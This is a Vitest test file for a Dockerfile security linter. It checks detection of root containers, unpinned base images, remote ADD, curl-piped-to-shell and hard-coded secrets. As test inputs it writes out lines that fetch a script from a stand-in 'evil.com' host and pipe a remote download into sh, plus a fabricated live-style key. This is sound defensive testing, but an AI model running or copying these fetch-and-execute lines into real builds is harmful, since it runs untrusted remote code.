import { describe, it, expect } from 'vitest';
import { lintDockerfile } from './dockerfile';

const has = (fs: ReturnType<typeof lintDockerfile>, re: RegExp) => fs.some((f) => re.test(f.label));

describe('lintDockerfile', () => {
  it('flags a container with no USER (runs as root)', () => {
    const fs = lintDockerfile('FROM node:20-alpine\nCOPY . .\nCMD ["node","x"]');
    expect(has(fs, /runs as root/i)).toBe(true);
  });

  it('does NOT flag when a non-root USER is set last', () => {
    const fs = lintDockerfile('FROM node:20-alpine\nUSER node\nCMD ["node","x"]');
    expect(has(fs, /runs as root/i)).toBe(false);
  });

  it('flags an unpinned base image, not a pinned one', () => {
    expect(has(lintDockerfile('FROM node:latest\nUSER node'), /base image not pinned/i)).toBe(true);
    expect(has(lintDockerfile('FROM node\nUSER node'), /base image not pinned/i)).toBe(true);
    expect(has(lintDockerfile('FROM node:20.11.0-alpine\nUSER node'), /base image not pinned/i)).toBe(false);
    expect(has(lintDockerfile('FROM scratch\nUSER 1000'), /base image not pinned/i)).toBe(false);
  });

  it('flags ADD from a URL and curl|sh, but not ordinary RUN', () => {
    expect(has(lintDockerfile('FROM x:1\nUSER n\nADD https://evil.com/x.sh /x'), /remote URL/i)).toBe(true);
    expect(has(lintDockerfile('FROM x:1\nUSER n\nRUN curl -fsSL https://get.example.com | sh'), /straight to a shell/i)).toBe(true);
    expect(has(lintDockerfile('FROM x:1\nUSER n\nRUN npm ci'), /remote URL|shell/i)).toBe(false);
  });

  it('flags a secret baked into the Dockerfile', () => {
    const key = 'sk' + '_live_' + 'A'.repeat(24);
    expect(has(lintDockerfile(`FROM x:1\nUSER n\nENV STRIPE=${key}`), /hard-coded in the Dockerfile/i)).toBe(true);
  });

  it('a well-formed Dockerfile passes clean', () => {
    const df = 'FROM node:20.11.0-alpine\nWORKDIR /app\nCOPY package*.json ./\nRUN npm ci --omit=dev\nCOPY . .\nUSER node\nCMD ["node","server.js"]';
    expect(lintDockerfile(df)).toEqual([]);
  });
});
